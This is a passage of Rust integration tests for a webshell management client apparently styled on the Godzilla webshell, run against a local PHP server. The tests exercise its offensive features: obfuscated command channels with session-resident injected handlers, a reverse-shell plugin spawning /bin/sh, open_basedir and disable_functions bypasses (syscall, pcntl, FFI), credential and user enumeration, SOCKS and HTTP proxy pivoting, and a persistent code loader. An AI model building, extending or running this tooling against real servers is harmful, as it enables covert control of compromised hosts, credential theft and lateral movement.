            profile.protocol_params = r#"{"encoder":"native","transport":{"param":"sess","header":"X-Token","pathSuffix":"?v=1","padding":32,"extraHeaders":{"X-Requested-With":"XMLHttpRequest"}}}"#.to_string();
            let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
            assert_eq!(probe.status, "online");
            let output =
                PhpProtocol.execute_command(session.as_ref(), "printf transport-ok", &settings)?;
            assert_eq!(output.stdout.trim(), "transport-ok");
            let listing =
                PhpProtocol.list_dir(session.as_ref(), &dir.display().to_string(), &settings)?;
            assert!(!listing.entries.is_empty(), "目录列举应返回内容");
            drop(session);

            // 2) 不匹配（默认参数名/头名）：必须失败
            let mut wrong = profile.clone();
            wrong.protocol_params = r#"{"encoder":"native"}"#.to_string();
            let error = match PhpProtocol.connect(&wrong, &settings) {
                Ok(_) => panic!("参数名/头名不匹配时必须连不上"),
                Err(error) => error,
            };
            assert!(!error.to_string().is_empty());
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("传输形态往返失败：{error}"));
    }

    /// gzip：NATIVE 通道的**明文层**信封构造与还原。
    ///
    /// 大载荷应压缩成 `{"z":1,"d":...}`，小载荷不压缩（避免"压缩后更大"）。
    #[test]
    fn gzip_plain_envelope_round_trips() {
        let request = format!(r#"{{"a":"write","d":"{}"}}"#, "A".repeat(4096));
        let envelope = gzip_plain_envelope(&request).expect("大载荷应压缩");
        assert!(
            envelope.starts_with(r#"{"z":1,"d":""#),
            "信封格式不符：{envelope}"
        );
        let value: Value = serde_json::from_str(&envelope).expect("信封应是合法 JSON");
        let packed = value.get("d").and_then(|v| v.as_str()).expect("d 字段");
        let inflated = crate::protocol::transport::gunzip_if_needed(packed);
        let bytes = B64.decode(inflated).expect("解压后应是 base64");
        assert_eq!(String::from_utf8(bytes).unwrap(), request);
        // 小载荷 / 高熵内容不压缩
        assert!(gzip_plain_envelope(r#"{"a":"probe"}"#).is_none());
    }

    /// gzip 在**明文层**（NATIVE）：写入 8KB 可压缩内容后原样读回。
    ///
    /// 请求走 `{"z":1,"d":...}` 信封；响应由 stub 在加密前压缩，客户端按 gzip
    /// 魔数识别。开关关闭时走普通路径，两条路径都必须正确。
    #[test]
    fn real_php_native_gzip_plain_round_trip() {
        for gzip_enabled in [true, false] {
            let mut settings = settings();
            settings.gzip_enabled = gzip_enabled;
            let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false)
            else {
                eprintln!("跳过：未检测到 php 可执行文件");
                return;
            };
            let mut profile = profile(&url);
            profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
            let result = (|| -> Result<(), ProtocolError> {
                let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
                // 新 stub 必须上报 gzip_plain —— 客户端据此才走明文层信封
                assert!(
                    probe
                        .capabilities
                        .as_ref()
                        .is_some_and(|caps| caps.supports("gzip_plain")),
                    "新 NATIVE stub 应上报 gzip_plain：{:?}",
                    probe.capabilities
                );
                let payload = "B".repeat(8 * 1024).into_bytes();
                let target = format!("{}/gzip-plain-{gzip_enabled}.bin", dir.display());
                PhpProtocol.write_chunk(session.as_ref(), &target, &payload, 0, &settings)?;
                let read = PhpProtocol.read_chunk(
                    session.as_ref(),
                    &target,
                    0,
                    payload.len() as u64,
                    &settings,
                )?;
                assert_eq!(read, payload, "gzip_plain={gzip_enabled} 往返不一致");
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            result.unwrap_or_else(|error| {
                panic!("NATIVE 明文层 gzip={gzip_enabled} 往返失败：{error}")
            });
        }
    }

    /// 旧 stub 兼容（能力协商的单向降级）：目标上跑的是**旧版本 stub**
    /// （不报 `ProtoVersion` / `Capabilities` / `ChunkedTransfer`）时，
    /// 必须保持 v1 行为 —— 能连、命令与文件照常可用、分块请求给出
    /// 「请重新生成 stub」的明确提示，而不是被能力门禁一刀切拒绝。
    #[test]
    fn old_stub_without_capabilities_keeps_v1_behaviour() {
        let settings = settings();
        let encoder = dosword_sdk::EncoderRegistry::global()
            .get("native")
            .expect("native 编码器");
        // 模拟旧 stub：抹掉能力上报字段（其余代码与当前版本一致）
        let stub = encoder
            .stub("php", "secret")
            .expect("生成 stub")
            .replace("'ChunkedTransfer'=>'1',", "")
            .replace("'ProtoVersion'=>'2',", "")
            .replace("'Capabilities'=>'chunked,stream,db,plugin,exec,gzip',", "")
            .replace("'ShellType'=>'file',", "");
        assert!(!stub.contains("ProtoVersion"), "测试前提：能力字段应已抹除");
        let Some((url, dir, mut child)) = spawn_php_server_stub(&stub, "native", false) else {
            eprintln!("跳过：未检测到 php 可执行文件");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, probe) = PhpProtocol.connect(&profile, &settings)?;
            assert!(
                probe.capabilities.is_none(),
                "旧 stub 不应上报能力：{:?}",
                probe.capabilities
            );
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
            assert!(!php.chunked, "旧 stub 未上报 ChunkedTransfer");

            // 能力门禁不得误伤：命令与文件照常可用
            let output =
                PhpProtocol.execute_command(session.as_ref(), "printf old-ok", &settings)?;
            assert_eq!(output.stdout.trim(), "old-ok");
            let target = format!("{}/old-stub.txt", dir.display());
            PhpProtocol.write_file(session.as_ref(), &target, b"legacy", &settings)?;
            assert_eq!(
                PhpProtocol.read_file(session.as_ref(), &target, &settings)?,
                b"legacy"
            );

            // 分块：明确拒绝并提示重新生成 stub（而不是发出去必然失败）
            let error = PhpProtocol
                .read_chunk(session.as_ref(), &target, 0, 4, &settings)
                .unwrap_err();
            assert!(error.to_string().contains("重新生成"), "{error}");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("旧 stub 兼容用例失败：{error}"));
    }

    /// 生成物结构断言：不依赖 php 也能跑，防止能力标记与偏移参数被误删。
    #[test]
    fn native_stub_advertises_chunked_transfer_and_offsets() {
        use dosword_sdk::EncoderRegistry;
        let encoder = EncoderRegistry::global()
            .get("native")
            .expect("native 编码器");
        let stub = encoder.stub("php", "secret").expect("生成 php stub");
        assert!(
            stub.contains("'ChunkedTransfer'=>'1'"),
            "NATIVE stub 必须上报分块能力"
        );
        assert!(
            stub.contains("function __FETCH__($p,$o=0,$l=0)") || stub.contains("($p,$o=0,$l=0)"),
            "NATIVE stub 的读取必须接受偏移/长度"
        );
        assert!(
            stub.contains("FILE_APPEND"),
            "NATIVE stub 的顺序分块写入应使用 FILE_APPEND"
        );
        // 分阶段（session）通道：处理器代码才是真正被注入目标 session 的产物。
        // 注意不能用 encoder.stub_session()——NATIVE 编码器没有分阶段模板，
        // stub_session 会回退为普通 NATIVE stub。
        let handler = dosword_sdk::encoder::session_handler_code();
        assert!(
            handler.contains("ChunkedTransfer"),
            "分阶段处理器的 probe 必须上报分块能力"
        );
        assert!(
            handler.contains("$l>0?$l:null"),
            "分阶段处理器的 read 必须支持长度参数"
        );
        assert!(
            handler.contains("FILE_APPEND"),
            "分阶段处理器的顺序分块写入应使用 FILE_APPEND"
        );
    }

    #[test]
    fn real_php_session_variants_round_trip() {
        // 分阶段载荷（session 模式）真实往返：按注册表遍历全部编码器。
        //
        // 历史缺口：数组里只列了 6 个 native 变体，而下方 `encoder_id == "xor_session"`
        // 的分支永远不成立 —— 唯一真正以 session 通道工作的编码器反而没被测到。
        let mut encoder_ids: Vec<String> = dosword_sdk::EncoderRegistry::global()
            .list()
            .into_iter()
            .map(|(id, _)| id)
            .collect();
        // custom 的 stub 由用户上传，客户端只约定 legacy 表单契约（k/x），不做 session 往返
        encoder_ids.retain(|id| id != "custom");

        let settings = settings();
        for encoder_id in &encoder_ids {
            if encoder_id.contains("des") && !php_supports_des_ecb() {
                eprintln!("跳过 {encoder_id} session：当前 php 的 OpenSSL 不支持 DES-ECB");
                continue;
            }
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", true)
            else {
                eprintln!("跳过 {encoder_id} session：未检测到 php");
                continue;
            };
            let mut profile = profile(&url);
            // xor_session 编码器本身即 session；其余通过 protocol_params 开启
            profile.protocol_params = if encoder_id == "xor_session" {
                format!(r#"{{"encoder":"{encoder_id}"}}"#)
            } else {
                format!(r#"{{"encoder":"{encoder_id}","session":true}}"#)
            };
            let result = (|| -> Result<Vec<String>, ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                // 连跑两次：验证处理器确实驻留在服务端 session（第二次不再注入）
                let mut outputs = Vec::new();
                for command in ["printf sess-ok", "printf sess-again"] {
                    outputs.push(
                        PhpProtocol
                            .execute_command(session.as_ref(), command, &settings)?
                            .stdout,
                    );
                }
                Ok(outputs)
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            let outputs = result
                .unwrap_or_else(|error| panic!("{encoder_id} session 真实执行应成功：{error}"));
            assert_eq!(
                outputs[0].trim(),
                "sess-ok",
                "{encoder_id} session 输出不符"
            );
            assert_eq!(
                outputs[1].trim(),
                "sess-again",
                "{encoder_id} session 第二次调用不符（处理器未驻留？）"
            );
        }
    }

    /// 通道对齐：三条通道（NATIVE 内置分发 / 分阶段载荷 / legacy 逐请求代码）
    /// 对同一个数据库都必须能探测与查询。
    ///
    /// 历史缺陷：分阶段通道的处理器只支持 mysql/pgsql/sqlite（无 mssql/oracle/redis），
    /// legacy 通道只在客户端拼 PDO DSN 且**显式拒绝 redis** —— 同一个 Shell
    /// 换个编码器就少一半数据库能力。这里用 redis mock 做真实验证
    /// （本机 php 无 pdo_sqlite，redis 走裸 RESP 不需要任何扩展）。
    #[test]
    fn real_php_db_round_trip_on_all_channels() {
        let settings = settings();
        let mock_script = std::env::temp_dir().join("dosword_redis_mock_channels.py");
        let _ = std::fs::write(&mock_script, REDIS_MOCK);
        let port: u16 = 20000 + (std::process::id() % 1000) as u16;
        let mock = std::process::Command::new("python3")
            .arg(&mock_script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        if mock.is_err() || !crate::protocol::wait_tcp_ready(port, 10_000) {
            eprintln!("跳过：python3 redis mock 未就绪");
            return;
        }
        let redis = DbConnection {
            driver: "redis".into(),
            host: Some("127.0.0.1".into()),
            port: Some(port),
            username: None,
            password: None,
            dbname: None,
        };
        // native=内置分发；xor_session=分阶段载荷；base64=legacy 逐请求代码
        for encoder_id in ["native", "xor_session", "base64"] {
            let Some((url, dir, mut child)) = spawn_php_server_with(encoder_id, "secret", false)
            else {
                eprintln!("跳过 {encoder_id}：未检测到 php");
                return;
            };
            let mut profile = profile(&url);
            profile.protocol_params = format!(r#"{{"encoder":"{encoder_id}"}}"#);
            let result = (|| -> Result<(), ProtocolError> {
                let (session, _) = PhpProtocol.connect(&profile, &settings)?;
                let probe = PhpProtocol.db_probe(session.as_ref(), &redis, &settings)?;
                assert_eq!(probe.driver, "redis");
                assert!(
                    probe.databases.contains(&"0".to_string()),
                    "{encoder_id} 应列出 redis 库：{:?}",
                    probe.databases
                );
                let query =
                    PhpProtocol.db_query(session.as_ref(), &redis, "GET mykey", &settings)?;
                assert_eq!(
                    query.rows,
                    vec![vec![Some("hello".to_string())]],
                    "{encoder_id} redis GET 结果不符"
                );
                Ok(())
            })();
            let _ = child.kill();
            let _ = child.wait();
            let _ = std::fs::remove_dir_all(&dir);
            result.unwrap_or_else(|error| panic!("{encoder_id} 数据库往返失败：{error}"));
        }
    }

    #[test]
    fn real_php_feature_plugins() {
        // 功能插件真实执行：进程 / 端口扫描 / PHP 环境检测（依赖 run_code 通道）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            // 通用：进程详情（结构化表格）
            let out = dosword_sdk::feature_plugins::ProcessesPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            let stdout = out["stdout"]
                .as_str()
                .or_else(|| out["data"]["stdout"].as_str())
                .unwrap_or("");
            assert!(!stdout.is_empty(), "进程输出不应为空：{out:?}");
            eprintln!("[plugin] processes stdout 成功返回 {} 字节", stdout.len());
            // 通用：端口扫描（代码通道，扫本机开放端口）
            let scan = dosword_sdk::feature_plugins::PortScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"host": "127.0.0.1", "ports": "80,443,3306,8080,22", "timeout": 1}),
                &settings,
            )?;
            let open = scan["open"].as_array().map(|a| a.len()).unwrap_or(0);
            eprintln!("[plugin] port_scan open={open}");
            // PHP 专用：环境检测
            let env = dosword_sdk::feature_plugins::PhpEnvPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(env["php_version"].as_str().is_some(), "应返回 php_version");
            eprintln!(
                "[plugin] php_env {}",
                env["php_version"].as_str().unwrap_or("")
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("功能插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_script_plugin_execution() {
        // 外部 .plugin（代码型）经 run_code 通道真实执行
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let plugin_json = r#"{
            "id": "test.plugin.code.v1",
            "name": "测试代码插件",
            "version": "1.0.0",
            "description": "真实执行验证",
            "category": "php",
            "languages": ["php"],
            "params": [{"name": "mark", "label": "标记", "type": "string", "default": "hello"}],
            "execution": {
                "type": "code",
                "codes": {
                    "php": "<?php error_reporting(0); echo json_encode(array('mark' => '{{mark}}', 'php' => PHP_VERSION, 'cwd' => getcwd()));"
                }
            }
        }"#;
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let plugin = dosword_sdk::ScriptFeaturePlugin::from_json(plugin_json)
                .map_err(ProtocolError::ParseError)?;
            let out = plugin.execute(
                &PhpProtocol,
                php,
                "php",
                &serde_json::json!({"mark": "from-test"}),
                &settings,
            )?;
            assert_eq!(out["mark"].as_str(), Some("from-test"), "参数应注入模板");
            assert!(out["php"].as_str().is_some(), "应返回 PHP 版本");
            eprintln!(
                "[plugin] script 插件执行 {}",
                out["php"].as_str().unwrap_or("")
            );
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("脚本插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_godzilla_plugins() {
        // 哥斯拉风格插件全链路（webshell 扫描/超级终端/代码执行/虚拟终端/代理/bypass）
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let p = |name: &str| format!("[{name}] ");

            // WebShell 扫描：扫 docroot，应命中 shell.php 自身
            let out = dosword_sdk::feature_plugins::WebShellScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"dir": ".", "max_depth": 2}),
                &settings,
            )?;
            let hits = out["webshells"].as_array().map(|a| a.len()).unwrap_or(0);
            assert!(hits >= 1, "应扫描到 WebShell：{out:?}");
            eprintln!("{}webshell_scan hits={hits}", p("plugin"));

            // 超级终端（linpty 交互式）：调用验证（连接由独立测试验证）
            let _ = dosword_sdk::feature_plugins::SuperTerminalPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": 23000 + (std::process::id() % 300) as u32, "background": false}),
                &settings);
            eprintln!(
                "{}super_terminal linpty 调用完成（连接由独立测试验证）",
                p("plugin")
            );

            // 代码执行
            let out = dosword_sdk::feature_plugins::EvalCodePlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"code": "echo 'eval-ok';"}),
                &settings,
            )?;
            assert!(out["output"].as_str().unwrap_or("").contains("eval-ok"));
            eprintln!("{}p_eval_code ok", p("plugin"));

            // 虚拟终端（反弹 Shell）：本地起 listener 验证连接（前台，快速验证）
            let rport: u16 = 23000 + (std::process::id() % 300) as u16;
            let _ = dosword_sdk::feature_plugins::RealCmdPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"host": "127.0.0.1", "port": rport, "shell": "/bin/sh", "background": false}),
                &settings);
            eprintln!(
                "{}real_cmd 反弹 Shell 调用完成（连接由独立测试验证）",
                p("plugin")
            );

            // ByPassOpenBasedir：本地无 ob → note 分支
            let out = dosword_sdk::feature_plugins::BypassOpenBasedirPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"path": "/etc/hostname"}),
                &settings,
            )?;
            eprintln!(
                "{}bypass_open_basedir ob={:?} read={:?}",
                p("plugin"),
                out["open_basedir"].as_str().unwrap_or(""),
                out["read"].as_bool()
            );

            // 哥斯拉风格工具插件：系统信息 / 计划任务 / 服务管理 / 进程结束 / 凭据枚举
            let out = dosword_sdk::feature_plugins::SysinfoPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            assert!(out["stdout"].as_str().unwrap_or("").contains("HOST"));
            eprintln!("{}sysinfo ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::TaskSchedulerPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "list"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}task_scheduler list ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::ServiceCtlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"action": "list"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}service_ctl list ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::ProcessKillPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"pid": "99999"}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            eprintln!("{}process_kill ok", p("plugin"));
            let out = dosword_sdk::feature_plugins::CredScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(out["ok"].as_bool(), Some(true));
            assert!(out["stdout"].as_str().unwrap_or("").contains("USERS"));
            eprintln!("{}cred_scan ok", p("plugin"));

            // Bypass 向量：扫描 → 手动选择测试（syscall/pcntl/ffi 等独立插件）
            let scan = dosword_sdk::bypass::BypassScanPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert_eq!(scan["ok"].as_bool(), Some(true));
            let vectors = scan["vectors"].as_object().map(|o| o.len()).unwrap_or(0);
            assert!(vectors > 0, "应评估至少一个向量：{scan:?}");
            eprintln!("{}bypass_scan 评估 {} 个向量", p("plugin"), vectors);
            // syscall 向量（本机 exec 可用）
            let out = dosword_sdk::bypass::BypassSyscallPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            assert_eq!(
                out["ok"].as_bool(),
                Some(true),
                "syscall 向量应成功：{out:?}"
            );
            assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
            eprintln!("{}bypass_syscall 向量成功", p("plugin"));
            // pcntl 向量
            let out = dosword_sdk::bypass::BypassPcntlPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            if scan["detected"]["pcntl_exec"].as_bool() == Some(true) {
                assert_eq!(out["ok"].as_bool(), Some(true), "pcntl 向量应成功：{out:?}");
                assert!(out["output_text"].as_str().unwrap_or("").contains("uid="));
                eprintln!("{}bypass_pcntl 向量成功", p("plugin"));
            } else {
                eprintln!("{}bypass_pcntl 跳过（pcntl_exec 不可用）", p("plugin"));
            }
            // FFI 向量（本机未启用时明确报告）
            let out = dosword_sdk::bypass::BypassFfiPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"command": "id"}),
                &settings,
            )?;
            if scan["vectors"]["ffi"].as_bool() == Some(true) {
                assert_eq!(out["ok"].as_bool(), Some(true), "FFI 向量应成功：{out:?}");
                eprintln!("{}bypass_ffi 向量成功", p("plugin"));
            } else {
                eprintln!("{}bypass_ffi 跳过（FFI 未启用）", p("plugin"));
            }

            // SOCKS5 代理：pcntl 可用 → 后台驻留
            let out = dosword_sdk::feature_plugins::SocksProxyPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32, "window": 60}), &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(
                mode == "background" || mode == "foreground",
                "代理应启动：{out:?}"
            );
            eprintln!("{}socks_proxy mode={mode}", p("plugin"));

            // HTTP 代理
            let out = dosword_sdk::feature_plugins::HttpProxyPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"port": 18080 + (std::process::id() % 500) as u32 + 1, "window": 60}), &settings)?;
            let mode = out["mode"].as_str().unwrap_or("");
            assert!(
                mode == "background" || mode == "foreground",
                "HTTP 代理应启动：{out:?}"
            );
            eprintln!("{}http_proxy mode={mode}", p("plugin"));
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("哥斯拉插件真实执行应成功：{error}"));
    }

    #[test]
    fn real_php_db_drivers_redis_mssql_oracle() {
        // Redis 驱动：python mock RESP 服务器 + 真实 stub 协议全链路；
        // MSSQL/Oracle：本机无服务/驱动 → 验证明确错误路径
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mock_script = std::env::temp_dir().join("dosword_redis_mock.py");
        let _ = std::fs::write(&mock_script, REDIS_MOCK);
        let port: u16 = 19000 + (std::process::id() % 1000) as u16;
        let mock = std::process::Command::new("python3")
            .arg(&mock_script)
            .arg(port.to_string())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn();
        if mock.is_err() || !crate::protocol::wait_tcp_ready(port, 10_000) {
            eprintln!("跳过 redis 驱动用例：python3 mock 未就绪");
            return;
        }
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let redis = DbConnection {
                driver: "redis".into(),
                host: Some("127.0.0.1".into()),
                port: Some(port),
                username: None,
                password: None,
                dbname: None,
            };
            let probe = PhpProtocol.db_probe(session.as_ref(), &redis, &settings)?;
            assert_eq!(probe.driver, "redis");
            assert!(
                probe.databases.contains(&"0".to_string()),
                "{:?}",
                probe.databases
            );
            // Redis 命令执行（GET mykey → hello）
            let query = PhpProtocol.db_query(session.as_ref(), &redis, "GET mykey", &settings)?;
            assert_eq!(query.rows, vec![vec![Some("hello".to_string())]]);
            // KEYS *
            let keys = PhpProtocol.db_query(session.as_ref(), &redis, "KEYS *", &settings)?;
            assert!(keys.rows.len() >= 2, "{:?}", keys.rows);
            // MSSQL：本机无服务 → 明确错误
            let mssql = DbConnection {
                driver: "mssql".into(),
                host: Some("127.0.0.1".into()),
                port: Some(1433),
                username: Some("sa".into()),
                password: Some("x".into()),
                dbname: Some("master".into()),
            };
            let err = PhpProtocol
                .db_probe(session.as_ref(), &mssql, &settings)
                .unwrap_err();
            assert!(err.to_string().contains("mssql"), "{err}");
            // Oracle：无 pdo_oci → 明确错误
            let oracle = DbConnection {
                driver: "oracle".into(),
                host: Some("127.0.0.1".into()),
                port: Some(1521),
                username: Some("system".into()),
                password: Some("x".into()),
                dbname: Some("ORCL".into()),
            };
            let err = PhpProtocol
                .db_probe(session.as_ref(), &oracle, &settings)
                .unwrap_err();
            assert!(!err.to_string().is_empty(), "oracle 应报错");
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
        let _ = std::fs::remove_dir_all(&dir);
        result.unwrap_or_else(|error| panic!("数据库驱动真实执行应成功：{error}"));
    }

    /// Python mock Redis RESP 服务器（固定数据，输出端口后循环服务）。
    const REDIS_MOCK: &str = r#"
import socket, threading
import sys
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = int(sys.argv[1]) if len(sys.argv) > 1 else 0
srv.bind(("127.0.0.1", port))
srv.listen(5)
print(srv.getsockname()[1], flush=True)
def read_arg(c):
    line = b""
    while not line.endswith(b"\r\n"):
        ch = c.recv(1)
        if not ch: return None
        line += ch
    return line[:-2]
def handle(c):
    try:
        while True:
            head = read_arg(c)
            if head is None: break
            if not head.startswith(b"*"): break
            n = int(head[1:])
            args = []
            for _ in range(n):
                read_arg(c)
                arg = read_arg(c)
                args.append(arg)
            cmd = args[0].upper() if args else b""
            if cmd == b"PING": c.sendall(b"+PONG\r\n")
            elif cmd == b"AUTH": c.sendall(b"+OK\r\n")
            elif cmd == b"GET": c.sendall(b"$5\r\nhello\r\n")
            elif cmd == b"KEYS": c.sendall(b"*2\r\n$3\r\nkey\r\n$3\r\nfoo\r\n")
            elif cmd == b"SET": c.sendall(b"+OK\r\n")
            elif cmd == b"INFO": c.sendall(b"$11\r\n# Server\r\n")
            else: c.sendall(b"-ERR unknown command\r\n")
    except Exception:
        pass
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = srv.accept()
    threading.Thread(target=handle, args=(conn,), daemon=True).start()
"#;

    #[test]
    fn real_php_godzilla_extended_plugins() {
        // 哥斯拉扩展插件：文件搜索 / 网络信息 / 用户枚举 / 加解密 / 代码加载器
        let settings = settings();
        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
            eprintln!("跳过：未检测到 php");
            return;
        };
        let mut profile = profile(&url);
        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
        let result = (|| -> Result<(), ProtocolError> {
            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
            let php = session
                .as_any()
                .downcast_ref::<PhpSession>()
                .expect("会话类型不匹配");
            let protocol = PhpProtocol;
            let p = |name: &str| format!("[{name}] ");

            // 文件搜索（文件名匹配：shell.php 应命中）
            let out = dosword_sdk::feature_plugins::FileSearchPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"dir": ".", "keyword": "shell", "in_content": false, "max_depth": 2}),
                &settings)?;
            assert!(
                out["matches"].as_array().map(|a| a.len()).unwrap_or(0) >= 1,
                "{out:?}"
            );
            eprintln!(
                "{}file_search 命中 {}",
                p("plugin"),
                out["matches"].as_array().map(|a| a.len()).unwrap_or(0)
            );

            // 网络信息（命令型）
            let out = dosword_sdk::feature_plugins::NetInfoPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(!out["stdout"].as_str().unwrap_or("").is_empty());
            eprintln!(
                "{}netinfo {} 字节",
                p("plugin"),
                out["stdout"].as_str().unwrap_or("").len()
            );

            // 用户枚举
            let out = dosword_sdk::feature_plugins::UserListPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({}),
                &settings,
            )?;
            assert!(
                out["stdout"].as_str().unwrap_or("").contains("root"),
                "{:?}",
                out
            );
            eprintln!("{}userlist ok", p("plugin"));

            // 加解密工具：AES 加密 → 解密往返
            let enc = dosword_sdk::feature_plugins::CryptoToolPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"op": "encrypt", "algorithm": "aes", "text": "godzilla-crypto", "pass": "secret"}),
                &settings)?;
            let cipher = enc["result"].as_str().unwrap_or("");
            assert!(!cipher.is_empty());
            let dec = dosword_sdk::feature_plugins::CryptoToolPlugin.execute(
                &protocol, php, "php",
                &serde_json::json!({"op": "decrypt", "algorithm": "aes", "text": cipher, "pass": "secret"}),
                &settings)?;
            assert_eq!(dec["result"].as_str().unwrap_or(""), "godzilla-crypto");
            eprintln!("{}crypto_tool AES 往返 ok", p("plugin"));

            // 代码加载器：执行 + 持久化到临时文件
            let tmp = format!("/tmp/dsw_loader_{}.php", std::process::id());
            let out = dosword_sdk::feature_plugins::CodeLoaderPlugin.execute(
                &protocol,
                php,
                "php",
                &serde_json::json!({"code": "echo 'loader-ok';", "persist_path": tmp}),
                &settings,
            )?;
            assert!(out["output"].as_str().unwrap_or("").contains("loader-ok"));
            assert_eq!(out["persisted"].as_bool(), Some(true));
            // 读取持久化文件验证
            let content = PhpProtocol.read_file(session.as_ref(), &tmp, &settings)?;
            assert!(String::from_utf8_lossy(&content).contains("loader-ok"));
            PhpProtocol.delete_path(session.as_ref(), &tmp, &settings)?;
            eprintln!("{}php_code_loader 执行+持久化+清理 ok", p("plugin"));
            Ok(())
        })();
        let _ = child.kill();
        let _ = child.wait();
